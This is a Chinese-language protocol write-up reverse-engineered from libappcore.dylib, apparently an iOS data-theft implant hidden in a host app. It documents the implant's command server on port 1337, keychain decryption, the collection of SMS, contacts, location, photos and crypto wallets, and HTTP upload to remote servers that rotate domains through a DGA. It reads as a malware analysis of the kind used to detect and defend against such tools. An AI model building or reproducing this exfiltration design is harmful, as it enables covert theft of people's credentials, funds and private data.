# libappcore 通信协议文档

> 基于 libappcore.dylib 逆向还原的通信协议

## 一、本地服务器协议（电脑端 ↔ 设备）

### 1.1 连接建立

```
设备端: 启动 TCP 服务器，监听端口 (动态分配，默认 1337)
设备端日志: "Running server on port %u"
设备端日志: "Waiting for connection on port %u"

电脑端: TCP 连接到 设备IP:端口
```

### 1.2 命令格式

```
客户端发送:
  +----------+----------+
  | command  | '\n'     |   命令名称 (ASCII)
  +----------+----------+
  | args     | '\n'     |   命令参数 (ASCII, 可选)
  +----------+----------+

设备端日志: "Read command from client: %@"
```

如果命令读取失败:
- 设备端日志: "Failed to read command from client, cannot start session."
- 设备端关闭连接

如果参数读取失败:
- 设备端日志: "Failed to read command arguments from client, cannot start session."
- 设备端关闭连接

如果设备未提权:
- 设备端日志: "Device not exploited, cannot start session."
- 设备端关闭连接

### 1.3 支持的命令

| 命令 | 参数 | 返回数据 | 说明 |
|------|------|----------|------|
| `filesystem` | 目标路径 (如 `/`) | tar.gz 二进制流 | 文件系统提取 |
| `keychain` | 无 | XML 文本 | 钥匙串提取 |
| `metadata` | 无 | JSON 文本 | 设备元数据 |
| `status` | 无 | JSON 文本 | 设备状态 |
| `version` | 无 | 纯文本 | Agent 版本 |
| `upload` | 上传类型 (可选) | JSON 文本 | 触发远程上传到服务器 |
| `memo` | 无 | XML 文本 | 备忘录提取 |
| `sms` | 无 | XML 文本 | 短信提取 |
| `contacts` | 无 | VCF 文本 | 通讯录提取 |
| `location` | 无 | JSON 文本 | 位置历史 |
| `wallet` | 无 | JSON 文本 | 加密货币钱包 |

### 1.4 数据传输

```
设备端日志: "Transfer started."
设备端日志: "Sending file: %@" (文件系统模式)
设备端发送: 二进制数据流 (直到连接关闭)

完成:
  设备端日志: "Finished file transfer."
  设备端日志: "Transfer finished with code: %d"
  设备端调用 ServerOnFinishTransfer
  设备端关闭连接

错误:
  设备端日志: "Got error while sending data."
  设备端日志: "Transfer unexpectedly failed: %@"
  设备端日志: "transfer error" / "transfer timeout" / "Transfer failed."
```

### 1.5 文件系统模式细节

- 使用 `libarchive` 创建 tar.gz 流
- 直接写入 socket fd (`archive_write_open_fd(ar, client_fd)`)
- 支持 gzip 压缩 (`archive_write_add_filter_gzip`)
- 格式: pax restricted (`archive_write_set_format_pax_restricted`)
- 遍历策略由 `FilesystemTraversalPolicy` 控制

### 1.6 钥匙串模式细节

- 复制 `/private/var/Keychains/keychain-2.db` 到临时目录
- 使用 `AgentKeyUnwrapper` 通过 AppleKeyStore 硬件解密
- 导出为 XML 格式 (`keychain_export.xml`)
- 支持 V3/V9/V11 三种钥匙串版本

### 1.7 upload 命令细节

`upload` 命令触发设备将已采集的数据上传到远程服务器：

```
客户端发送:
  upload\n
  <type>\n          (可选, 不指定则上传全部)

设备端响应:
  {"status":"ok","uploaded":["metadata","keychain"]}
```

支持的上传类型:
- `metadata` - 设备元数据 (JSON)
- `keychain` - 钥匙串 (XML)
- `filesystem` - 文件系统 (tar.gz)
- `memo` - 备忘录 (XML)
- `sms` - 短信 (XML)
- `contacts` - 通讯录 (VCF)
- `wallet` - 加密货币钱包 (JSON)
- `location` - 位置历史 (JSON)
- `thumbnail` - 缩略图批量 (JPG)

上传目标 URL 由 `SimpleUploader` 运行时配置，支持 MonthlyCycleDGA 域名轮换。

---

## 二、远程上传协议（设备 → 远程服务器）

### 2.1 HTTP 请求

```
POST http://<server>/upload/<type> HTTP/1.1
Host: <server>
Content-Type: application/octet-stream
X-OS-Version: <iOS版本>
X-Bundle-ID: <宿主App Bundle ID>
acquisition-id: <UUID>
Content-Length: <文件大小>

<二进制文件内容>
```

### 2.2 URL 构建

- 基础 URL 运行时确定: `http://%@` (NSString stringWithFormat)
- 路径: `/upload/<type>`
- type 包括: `filesystem`, `keychain`, `metadata`, `thumbnail`, `file`

### 2.3 HTTP 头说明

| 头 | 说明 | 示例 |
|----|------|------|
| `X-OS-Version` | iOS 系统版本 | `15.4.1` |
| `X-Bundle-ID` | 宿主应用 Bundle ID | `org.cocos2d.demo` |
| `acquisition-id` | 本次采集唯一 ID | `UUID字符串` |
| `Content-Type` | 固定值 | `application/octet-stream` |

### 2.4 上传类型

| type | 内容 | 格式 |
|------|------|------|
| `filesystem` | 文件系统归档 | tar.gz |
| `keychain` | 钥匙串导出 | XML |
| `metadata` | 设备元数据 | JSON |
| `thumbnail` | 缩略图批量 | 多个文件 |
| `file` | 单个文件 | 原始二进制 |

### 2.5 批量上传

- `SimpleUploader uploadThumbBatch:` 批量上传缩略图
- 每个文件单独一个 POST 请求
- 使用 `NSURLSession` 异步上传
- 超时: 30 秒 (`setTimeoutIntervalForRequest:30`)

### 2.6 服务器响应

```
成功 (HTTP 200):
  {"status":"ok","file_id":"<uuid>","size":<bytes>}

失败 (HTTP 4xx/5xx):
  {"error":"<error_type>","message":"<description>"}

速率限制 (HTTP 429):
  {"error":"rate_limit","retry_after":<seconds>}

文件过大 (HTTP 413):
  {"error":"file_too_large","max_mb":<limit>}
```

### 2.7 上传类型完整列表

| type | 内容 | 格式 | 扩展名 |
|------|------|------|--------|
| `filesystem` | 文件系统归档 | tar.gz | .tar.gz |
| `keychain` | 钥匙串导出 | XML | .xml |
| `metadata` | 设备元数据 | JSON | .json |
| `thumbnail` | 缩略图批量 | JPG | .jpg |
| `file` | 单个文件 | 原始二进制 | .bin |
| `plist` | 配置文件 | plist | .plist |
| `database` | 数据库文件 | SQLite | .db |
| `memo` | 备忘录 | XML | .xml |
| `private_key` | 私钥信息 | JSON | .json |
| `sms` | 短信 | XML | .xml |
| `call_log` | 通话记录 | XML | .xml |
| `contacts` | 通讯录 | VCF | .vcf |
| `photo` | 照片 | JPG | .jpg |
| `video` | 视频 | MP4 | .mp4 |
| `location` | 位置历史 | JSON | .json |
| `browser` | 浏览器数据 | tar.gz | .tar.gz |
| `wallet` | 加密货币钱包 | JSON | .json |

---

## 三、数据收集器 (DataCollector)

### 3.1 定向收集

`DataCollector_CreateTargetedTarGz` 创建定向 tar.gz 归档，包含：

- 加密货币钱包数据 (Phantom/Coinbase/BitKeep/Coin98/Exodus/OneKey)
- 系统数据库 (keychain-2.db, sms.db, AddressBook)
- 应用配置 (plist 文件)
- 缩略图索引 (thumb_index.db, photo_index26.db)

### 3.2 无限制文件系统

`gUnrestrictedFilesystem` 全局变量控制是否启用无限制文件系统访问（提权后启用）。

---

## 四、设备标识

### 4.1 UUID

- `get_device_uuid()` 获取设备 UUID
- 缓存: `cachedUUID` 静态变量
- 持久化: `save_uuid_to_keychain()` 存入钥匙串
- 用于 `acquisition-id` HTTP 头

### 4.2 设备信息

`IOSDeviceInfo` 类提供:
- `GetDeviceName` — 设备名称
- `GetDeviceType` — 设备型号 (iPhone12,1)
- `GetIOSVersion` — iOS 版本
- `GetSerialNumber` — 序列号
- `GetUDID` — UDID
- `IsLockscreenOn` — 锁屏状态
